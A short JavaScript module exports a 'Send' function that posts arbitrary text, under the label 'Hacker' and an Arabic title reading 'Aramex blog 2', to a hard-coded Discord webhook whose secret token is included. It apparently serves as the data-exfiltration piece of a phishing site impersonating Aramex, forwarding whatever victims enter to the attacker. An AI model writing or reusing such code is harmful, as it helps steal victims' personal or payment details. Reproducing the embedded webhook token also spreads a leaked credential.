import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1326547227346210826/dyFf_Y_4jPPvJ5e9HZcZN_UNfCh6RdZ76f0jf-DoQgHPFE7NHSUd-rBlxBQcG4a3oK4J",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
